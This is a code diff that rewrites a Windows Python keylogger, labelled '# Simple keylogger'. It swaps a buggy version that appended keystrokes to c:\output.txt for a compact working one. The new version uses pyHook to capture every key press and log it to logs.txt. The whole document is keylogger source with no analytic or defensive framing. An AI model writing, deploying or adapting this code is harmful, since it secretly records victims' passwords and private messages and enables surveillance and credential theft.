@@ -1,34 +1,15 @@
-import win32api
-import win32console
-import win32gui
-import pythoncom
-import pyHook
+# Simple keylogger
+import pyHook, pythoncom, sys, logging
 
-win = win32console.GetConsoleWindow()
-win32gui.ShowWindow(win, 1)
+file_log = 'logs.txt'
 
 def OnKeyboardEvent(event):
-	if (event.Ascii == 5):
-		_exit(1)
-	if (event.Ascii != 0 or 8):
-		f = open('c:\output.txt', 'r+')
-		buffer = f.read()
-		f.close()
+	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+	chr(event.Ascii)
+	logging.log(10, chr(event.Ascii))
+	return True
 
-		f = open('c:\output', 'w')
-		keylogs = chr(event.Ascii)
-		if (event.Ascii == 13):
-			keylogs = '/n'
-
-		buffer += keylogs
-		f.write(buffer)
-		f.close()
-
-
-
-hm = pyHook.HookManager()
-hm.keyDown = OnKeyboardEvent
-
-hm.HookKeyboard()
-
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
